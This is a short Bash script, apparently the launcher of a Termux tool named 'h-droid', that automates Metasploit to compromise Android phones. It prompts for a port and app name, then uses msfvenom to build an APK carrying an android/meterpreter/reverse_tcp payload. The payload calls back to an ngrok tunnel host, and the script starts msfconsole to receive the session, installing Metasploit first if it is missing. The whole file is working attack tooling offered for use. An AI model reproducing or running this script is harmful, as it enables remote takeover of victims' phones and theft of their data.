echo 'METASPLOIT installed ??? ( yes / no )'
read -p '>> ' meta
if [ $meta = yes ]
then
echo 'new hack android ? ( yes / no ) '
read -p '>> ' check
     if [ $check = yes ]
     then
echo LPORT: | lolcat
read -p '>> ' LPORT
rm -rf /$HOME/a/LPORT.rc
echo set LPORT $LPORT  >/$HOME/a/LPORT.rc
echo Apk name: | lolcat
read -p '>> ' APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
msfconsole -r auto.rc
     else
echo 'you must run this commamd to start: '
echo 'exploit' | lolcat
msfconsole -r auto.rc
     fi
else
echo 'you must install metasploit to run h-droid'
echo 'CONTINUE ??? ( y / n ) ' | lolcat -a
read -p '>> ' con-check
     if [ $con-check = y ]
     then
pkg install metasploit -y
clear
toilet -f slant -w 40 install COMPLETE !!! | lolcat -a
h-droid
     else
echo 'You can't use h-droid'
     fi
fi

